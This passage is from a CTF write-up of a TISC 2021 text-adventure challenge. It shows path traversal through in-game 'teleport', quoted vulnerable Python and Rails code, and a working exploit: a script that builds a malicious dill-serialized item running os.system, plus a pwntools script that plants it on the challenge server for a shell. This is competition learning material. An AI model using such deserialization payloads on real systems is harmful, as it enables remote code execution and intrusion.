+  * generate_items.py (note)
+  * rabbithole.py (note)
+
+You see exits to the:
+  * art
+  * stories
+  * __pycache__
+```
+
+Okay, so we can traverse the filesystem of the host server *from within the game*. So I explored a little bit and eventually found this:
+
+```
+[..] teleport ../../../../home/rabbit
+You have moved to a new location: 'rabbit'.
+
+You look around and see:
+You enter the Rabbit's burrow and find it completely ransacked. Scrawled across the walls of the
+tunnel is a message written in blood: 'Murder for a jar of red rum!'.
+
+Your eyes are drawn to a twinkling letter and a lockbox that shines at you from the dirt.
+
+There are the following things here:
+  * flag2.bin (note)
+  * flag1 (note)
+
+[rabbit] read flag1
+You read the writing on the note:
+TISC{r4bbb1t_kn3w_1_pr3f3r_p1}
+```
+
+**Flag 1 (25 points):** `TISC{r4bbb1t_kn3w_1_pr3f3r_p1}`
+
+***
+<br>
+
+![level 9-2 flavourtext](/assets/tisc-2021/desc_9b.png)
+
+`blowsmoke` was fixed at this point, and I had access to the game's source code in the form of `rabbithole.py`, so I decided to find out what it was trying to do. Here's the relevant section of code:
+
+```python
+class BlowSmokeCommand(Command):
+    '''Blows smoke to leave a mark on the world.
+    '''
+
+    def __init__(self, game):
+        super().__init__(game)
+
+    def run(self, args):
+        if len(args) < 3:
+            # Print location.
+            letterwise_print("What do you wish to say?")
+            return
+
+        letterwise_print('Smoke bellows from the lips of {} to form the words, "{}."'.format(
+            args[1], ' '.join(args[2:])))
+        letterwise_print('Curling and curling...')
+        uniqid = "{}-{}".format(self.game.location.name, clean_identifiers(args[1]))
+        content = ' '.join(args[2:]).replace(' ', '%20').replace('&','')
+        url = "{}?cargs[]=wb&uniqid={}&content={}".format(POOL_OF_TEARS, uniqid, content)
+        response = urlopen(url)
+        response_contents = response.read()
+        if response_contents == b'OK':
+            letterwise_print('The words float up high into the air and eventually disappate.')
+        else:
+            letterwise_print('The words harden into pasty rocks and drop to the ground.')
+            letterwise_print('They spell:')
+            letterwise_print(response_contents)
+
+    def help(self):
+        hstr = (
+            'Usage: blowsmoke [your name] [your message]\n'
+            'Leave your mark on the universe.'
+        )
+        return ('blowsmoke', hstr)
+
+    def key(self, arg):
+        return 'blowsmoke' ==  arg
+```
+
+The server in question turned out to be a locally hosted Ruby on Rails instance at port 4000, running the following:
+
+```ruby
+class SmokeController < ApplicationController
+
+  skip_parameter_encoding :remember
+
+  def remember
+    # Log down messages from our happy players!
+
+    begin
+      ctype = "File"
+      if params.has_key? :ctype
+        # Support for future appending type.
+        ctype = params[:ctype]
+      end
+
+      cargs = []
+      if params.has_key?(:cargs) && params[:cargs].kind_of?(Array)
+        cargs = params[:cargs]
+      end
+
+      cop = "new"
+      if params.has_key?(:cop)
+        cop = params[:cop]
+      end
+
+      if params.has_key?(:uniqid) && params.has_key?(:content)
+        # Leave the kind messages
+        fn = Rails.application.config.message_dir + params[:uniqid]
+        cargs.unshift(fn)
+        c = ctype.constantize
+        k = c.public_send(cop, *cargs)
+        if k.kind_of?(File)
+          k.write(params[:content])
+          k.close()
+        else
+          # TODO: Implement more types when we need distributed logging.
+          # PALINDROME: Won't cat lovers revolt? Act now!
+          render :plain => "Type is not implemented yet."
+          return
+        end
+
+      else
+        render :plain => "ERROR"
+        return
+      end
+    rescue => e
+      render :plain => "ERROR: " + e.to_s
+      return
+    end
+
+    render :plain => "OK"
+  end
+end
+```
+
+The important takeaway is that `blowsmoke` creates files in `/opt/wonderland/logs`. I tried it with a test input just as an experiment:
+
+```
+[logs] blowsmoke Alice hello again!
+Smoke bellows from the lips of Alice to form the words, "hello again!."
+Curling and curling...
+The words float up high into the air and eventually disappate.
+[logs] read logs-Alice
+You read the writing on the note:
+hello again!
+```
+
+What can we do with this? Well, earlier we learnt that the "locations" in-game are just directories, and the "notes" are just files. What about the items that we picked up? I took a look at `generate_items.py`, which gave some insight into things:
+
+```python
+#!/usr/bin/env python
+
+'''
+Helper script to generate Dill-based items for the story tree.
+
+Run in the directory it is in.
+'''
+
+from rabbithole import (Item, letterwise_print, OptionsCommand, TeleportCommand, BlowSmokeCommand,
+                        sleep)
+import pathlib
+import dill
+import types
+
+
+# Constants
+
+dill.settings['recurse'] = True
+STORY_BASE = pathlib.Path('./stories').absolute()
+
+
+# Utilities
+
+def write_object(location, obj):
+    '''Writes an object to the specified location.
+    '''
+    with open(location, 'wb') as f:
+        dill.dump(obj, f, recurse=True)
+
+
+def make_item(key, on_get):
+    '''Makes a new item dynamically.
+    '''
+    item = Item(key)
+    item.on_get = types.MethodType(on_get, item)
+    return item
+
+
+# The Pocket Watch - at bottom-of-a-pit/a-shallow-deadend
+# Intended to give players a way to access the options menu.
+
+def pocket_watch_on_get(self):
+    '''Add the options command when picked up.
+    '''
+    letterwise_print('The pocket watch glows with a warm waning energy and you feel less '
+                     'muddled in mind.')
+    self.game.commands.append(OptionsCommand(self.game))
+
+def setup_pocket_watch():
+    item = make_item('pocket-watch', pocket_watch_on_get)
+    path = STORY_BASE / 'bottom-of-a-pit/a-shallow-deadend/pocket-watch.item'
+    write_object(path, item)
+
+# (other items omitted from this snippet)
+```
+
+So "items" are just Python objects, serialised with dill saved as a file with a `.item` suffix. Perhaps we could create our own instance of `Item` and get it to run a shell when we pick it up in-game?
+
+I copied the definition of the `Item` class over from `rabbithole.py`, imitated the format of the pocket watch's declaration to create my own item, then serialised it with dill. Unfortunately, this first attempt failed:
+
+```
+Curling and curling...
+The words float up high into the air and eventually disappate.
+[vast-emptiness] teleport ../../logs
+You have moved to a new location: 'logs'.
+
+You look around and see:
+Darkness fills your senses. Nothing can be discerned from your environment.
+There are the following things here:
+  * vast-emptiness-shell (item)
+  * logs-Alice (note)
+
+[logs] get vast-emptiness-shell
+Seems like that item may be an illusion.
+```
+
+Hmm. As it turns out, my serialised item had failed a check just before it was picked up. Let's look at the `get` command:
+
+```python
+class GetCommand(Command):
+    '''Gets an item from the ground in the current room.
+    '''
+
+    def __init__(self, game):
+        super().__init__(game)
+
+    def validate_stream(self, data):
+        '''Validates that the byte stream contains suitable dill serialized content.
+        '''
+        tests = {
+            'rabbithole': False,
+            'dill._dill': False,
+            'on_get': False,
+        }
+        try:
+            ops = pickletools.genops(data)
+            for op, arg, pos in ops:
+                if op.name == 'SHORT_BINUNICODE' and arg in tests:
+                    tests[arg] = True
+            for _, v in tests.items():
+                if not v:
+                    return False
+            return True
+        except:
+            var = traceback.format_exc()
+            pprint(var)
+            return False
+
+    def run(self, args):
+        if len(args) < 2:
+            letterwise_print("You don't see that here.")
+            return
+        for i in self.game.get_items():
+            if (args[1] + '.item') == i.name and args[1] not in self.game.inventory:
+                got_something = True
+                # Check that the item must be serialized with dill.
+                item_data = open(i, 'rb').read()
+                if not self.validate_stream(item_data):
+                    letterwise_print('Seems like that item may be an illusion.')
+                    return
+                item = dill.loads(item_data)
+                letterwise_print("You pick up '{}'.".format(item.key))
+                self.game.inventory[item.key] = item
+                item.prepare(self.game)
+                item.on_get()
+                return
+
+        letterwise_print("You don't see that here.")
+
+    def help(self):
+        hstr = (
+            'Usage: get [item]\n'
+            'Retrieves an item from the ground.'
+        )
+        return ('get', hstr)
+
+    def key(self, arg):
+        return 'get' ==  arg
+```
+
+So the game validates the item for checking for the `rabbithole`, `dill._dill` and `on_get` properties; I was failing the first one. To resolve this, I imported the `Item` class from `rabbithole.py` instead of copying its declaration over.
+
+This was my item generation script:
+
+```python
+from rabbithole import (Item, letterwise_print, OptionsCommand, TeleportCommand, BlowSmokeCommand,
+                        sleep, readline)
+import pathlib
+import dill
+import types
+import sys
+import subprocess
+import os
+
+
+def write_object(location, obj):
+    '''Writes an object to the specified location.
+    '''
+    with open(location, 'wb') as f:
+        dill.dump(obj, f, recurse=True)
+
+
+def make_item(key, on_get):
+    '''Makes a new item dynamically.
+    '''
+    item = Item(key)
+    item.on_get = types.MethodType(on_get, item)
+    return item
+
+def shell_on_get(self):
+    '''Add the options command when picked up.
+    '''
+    while True:
+    	try:
+    		command = readline("> ").rstrip("\n")
+    		os.system(command)
+    		sys.stdout.flush()
+    	except:
+	    	pass
+
+def setup_shell():
+    item = make_item('shell', shell_on_get)
+    path = 'shell.item'
+    write_object(path, item)
+    
+setup_shell()
+```
+
+This created a new file `shell.item` on my system. Then I ran the following exploit:
+
+```python
+from pwn import *
+import pickletools
+
+f = open("shell.item","rb")
+new_item = f.read()
+payload = ''.join(['%%%02x' % c for c in new_item]) # Convert payload to a URL-encoded string
+
+p = remote("165.22.48.155","26181")
+p.sendlineafter("] ",b"move a-shallow-deadend")
+p.sendlineafter("] ",b"get pocket-watch")
+p.sendlineafter("] ",b"options text_scroll false")
+p.sendlineafter("] ",b"back")
+p.sendlineafter("] ",b"move deeper-into-the-burrow")
+p.sendlineafter("] ",b"move a-curious-hall")
+p.sendlineafter("] ",b"get pink-bottle")
+p.sendlineafter("] ",b"move a-pink-door")
+p.sendlineafter("] ",b"move maze-entrance")
+p.sendlineafter("] ",b"move knotted-boughs")
+p.sendlineafter("] ",b"move dazzling-pines")
+p.sendlineafter("] ",b"move a-pause-in-the-trees")
+p.sendlineafter("] ",b"move confusing-knot")
+p.sendlineafter("] ",b"move green-clearing")
+p.sendlineafter("] ",b"move a-fancy-pavillion")
+p.sendlineafter("] ",b"get fluffy-cake")
+p.sendlineafter("] ",b"move along-the-rolling-waves")
+p.sendlineafter("] ",b"move a-sandy-shore")
+p.sendlineafter("] ",b"move a-mystical-cove")
+p.sendlineafter("] ",b"get looking-glass")
+p.sendlineafter("] ",b"teleport sea-of-tears/along-the-rolling-waves/a-sandy-shore/into-the-woods/further-into-the-woods/nearing-a-clearing/clearing-of-flowers/under-a-giant-mushroom")
+p.sendlineafter("] ",b"get golden-hookah")
+p.sendlineafter("] ","blowsmoke shell.item " + payload)
+p.sendlineafter("] ",b"teleport ../../logs")
+p.sendlineafter("] ",b"get vast-emptiness-shell")
+
+p.interactive()
+```
+
+```
+(initial output omitted)
+[*] Switching to interactive mode
+Smoke bellows from the lips of shell.item to form the words, "%80%04%95%2e%02%00%00%00%00%00%00%8c%0a%72%61%62%62%69%74%68%6f%6c%65%94%8c%04%49%74%65%6d%94%93%94%29%81%94%7d%94%28%8c%03%6b%65%79%94%8c%05%73%68%65%6c%6c%94%8c%06%6f%6e%5f%67%65%74%94%8c%0a%64%69%6c%6c%2e%5f%64%69%6c%6c%94%8c%0a%5f%6c%6f%61%64%5f%74%79%70%65%94%93%94%8c%0a%4d%65%74%68%6f%64%54%79%70%65%94%85%94%52%94%68%08%8c%10%5f%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e%94%93%94%28%68%08%8c%0c%5f%63%72%65%61%74%65%5f%63%6f%64%65%94%93%94%28%4b%01%4b%00%4b%00%4b%02%4b%06%4b%43%43%3a%7a%26%74%00%64%01%83%01%a0%01%64%02%a1%01%7d%01%74%02%a0%03%7c%01%a1%01%01%00%74%04%6a%05%a0%06%a1%00%01%00%57%00%71%00%01%00%01%00%01%00%59%00%71%00%30%00%71%00%64%03%53%00%94%28%8c%2c%41%64%64%20%74%68%65%20%6f%70%74%69%6f%6e%73%20%63%6f%6d%6d%61%6e%64%20%77%68%65%6e%20%70%69%63%6b%65%64%20%75%70%2e%0a%20%20%20%20%94%8c%02%3e%20%94%8c%01%0a%94%4e%74%94%28%8c%08%72%65%61%64%6c%69%6e%65%94%8c%06%72%73%74%72%69%70%94%8c%02%6f%73%94%8c%06%73%79%73%74%65%6d%94%8c%03%73%79%73%94%8c%06%73%74%64%6f%75%74%94%8c%05%66%6c%75%73%68%94%74%94%8c%04%73%65%6c%66%94%8c%07%63%6f%6d%6d%61%6e%64%94%86%94%8c%24%2f%68%6f%6d%65%2f%61%6d%61%72%6f%6b%2f%74%69%73%63%2f%6c%65%76%65%6c%39%2f%6c%65%76%65%6c%39%2d%32%2e%70%79%94%8c%0c%73%68%65%6c%6c%5f%6f%6e%5f%67%65%74%94%4b%1d%43%0c%00%04%02%01%0e%01%0a%01%0e%01%06%01%94%29%29%74%94%52%94%7d%94%28%8c%02%6f%73%94%68%08%8c%0e%5f%69%6d%70%6f%72%74%5f%6d%6f%64%75%6c%65%94%93%94%68%19%85%94%52%94%8c%03%73%74%72%94%68%0a%8c%03%73%74%72%94%85%94%52%94%8c%04%74%79%70%65%94%68%0a%8c%04%74%79%70%65%94%85%94%52%94%8c%03%73%79%73%94%68%2a%8c%03%73%79%73%94%85%94%52%94%8c%08%72%65%61%64%6c%69%6e%65%94%68%00%68%17%93%94%75%68%23%4e%4e%7d%94%4e%74%94%52%94%68%03%86%94%52%94%75%62%2e."
+Curling and curling...
+The words float up high into the air and eventually disappate.
+[vast-emptiness] $ teleport ../../logs
+You have moved to a new location: 'logs'.
+
+You look around and see:
+Darkness fills your senses. Nothing can be discerned from your environment.
+There are the following things here:
+  * vast-emptiness-shell (item)
+  * logs-Alice (note)
+
+[logs] $ get vast-emptiness-shell
+You pick up 'shell'.
+> ./home/rabbit/flag2.bin
+TISC{dr4b_4s_a_f00l_as_al00f_a5_A_b4rd}
+```
+
+**Flag 2 (25 points):** `TISC{dr4b_4s_a_f00l_as_al00f_a5_A_b4rd}`
+
+***
+<br>
+
+![level 9-3 flavourtext](/assets/tisc-2021/desc_9c.png)
+
+I did not solve this challenge, as I wasn't even on the right track.
+
+I had earlier made note of the blatant `Curling and curling...` hint to use `curl`, but for some reason it never really crossed my mind that I could use the shell I just obtained to directly issue requests to the server without having to adhere to the format or location mandated by `blowsmoke`.
+
+Instead, not really motivated at this point, I aimlessly wandered the filesystem until I got bored and eventually called it a day.
+
+You can read the challenge creator's writeup for all 4 parts of this challenge [here](https://nandynarwhals.org/tisc-2021-1865-text-adventure/).
+
+***
+
+## Afterword
+
+TISC 2021 brought about many firsts in my journey into cybersecurity. I'd like to see myself as finally having taken the first step into this world that I've wanted to be a part of for a long time.
+
+As someone who always had interest, but never really dabbled in security in my free time, I'm extremely surprised (and a bit horrified) that I made it as far as I did. Considering the haphazard approach I took to solving some of the challenges, I guess you could call it beginner's luck.
+
+It was also pretty cool to read other participants' writeups and find out how different (or coincidentally similar) our approaches were to the different problems we encountered.
+
+Regardless, it was an unforgettable experience all around. Here's to many more CTFs in the future :)
+
+![final standings](/assets/tisc-2021/standings.png)
+
+***
+
+## Additional links
+
+Eugene's writeup (featuring all 10 levels!): <https://spaceraccoon.dev/the-infosecurity-challenge-2021-full-writeup-battle-royale-for-30k>
